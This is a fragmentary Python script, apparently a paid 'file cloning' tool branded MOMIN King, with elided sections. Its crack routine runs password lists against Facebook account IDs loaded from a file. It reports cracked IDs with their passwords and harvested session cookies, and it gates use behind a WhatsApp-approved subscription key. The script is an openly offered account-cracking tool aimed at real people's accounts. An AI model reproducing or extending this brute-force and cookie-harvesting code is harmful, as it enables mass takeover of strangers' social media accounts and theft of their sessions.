...
try:
	...
	print('[[\x1b[1;92m+\x1b[1;97m] [\x1b[1;96mMOMIN')
...
os.system('espeak -a 300 " Welcome,   to,  Momin,  King,  Tools"')
os.system('xdg-open') 
def banner():
	os.system("clear")
	print (f"""
...
╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
\033[0;94m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗\033[1;33m 
╠══[Author                   • \33[1;38mMR-MOMIN ]\33[1;38m     ║\033[1;31m 
╠══[Facebook                 • MOMIN-KING ]   ║  \033[1;97m  
╠══[Github                   • \33[1;38mMOMIN-KING ]   ║\33[1;34m   
╠══[Whatsapp                 • 016★★★★★★★★ ]  ║\33[1;35m 
╠══[TOOLS                    • Paid  ]        ║ \33[1;32m   
╠══[VERSION                  • 99.99 ]          ║\033[1;35m 
\033[0;94m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝\033[1;31m""")
def login():
	banner()
	MOMINj('\033[1;96m[1] File Cloning\n\x1b[1;92m[2] Contact With Admin\n\033[0;97m[0] \033[0;91mEXIT ')
	MOMINj('\033[0;97m===============================================')
	MOMIN= input('\x1b[1;92m[+] CHOOSE: ');time.sleep(0.01)
	if MOMIN in ['m']:
		public()
	elif MOMIN in ['1']:
		crack_file()
		...
		os.system('xdg-open https://wa.me/+8801893228328')
	elif MOMIN in ['0']:
...
def crack_file():
	...
	print('\033[1;32m[ Put File Example:  /sdcard/Momin.txt  Etc...]')
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r{bo}[MOMIN-XD] {P}[{h}{loop}{P}]>~<[{h}{len(id)}{P}]{bo}•{P}[{h}Ok{P}•{bo}{ok}{P}] "),
	sys.stdout.flush()
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				#MOMIN-King
				#print(f'\r\033[0;94m[{time.strftime("%H:%M")}•MOMIN-Cp] {idf} • {pw}')     
				...
				#MOMIN-King
				print(f'\r\033[0;92m[{time.strftime("%H:%M")}•MOMIN-Ok💚] {idf} • {pw}\n\033[0;93m[🌺]= COOKIES • \033[0;92m{kuki} ')
				print('\033[0;94m==============================================================')
				os.system('espeak -a 300 " MOMIN,  Ok,  id"')
...
def Subscraption():
	...
	r1=requests.get("https://github.com/alamin195575/MR-MOMIN/blob/main/Aprovel.txt").text
	if key1 in r1:
		os.system('clear')
		login()
	else:
		...
		time.sleep(0.0010)
		print("\033[97;1m[\033[92;1m•\033[97;1m]\x1b[38;5;208m MOMIN King, ToOLs Daily Update")
		print("\033[97;1m[\033[92;1m•\033[97;1m]\33[0;92m 7 DAYS 300 Tk")
		print("\033[97;1m[\033[92;1m•\033[97;1m]\33[0;92m 15 DAYS 500 Tk")
		print("\033[97;1m[\033[92;1m•\033[97;1m]\33[0;92m Your Key  :\033[0;93m "+ak+Momin+key1)
		...
		time.sleep(3.5)
		tks = 'Assalamu%20Alaikum-!💚,%20Please%20Approved%20My%20Key%20To%20Premium%20%20Thanks%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20Name%20:%20'+name+'%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20%20Key%20%20:%20'+ak+MOMIN+''+key1
		os.system('am start https://wa.me/+8801893228328?text=' + tks)
		Subscraption() 
login()
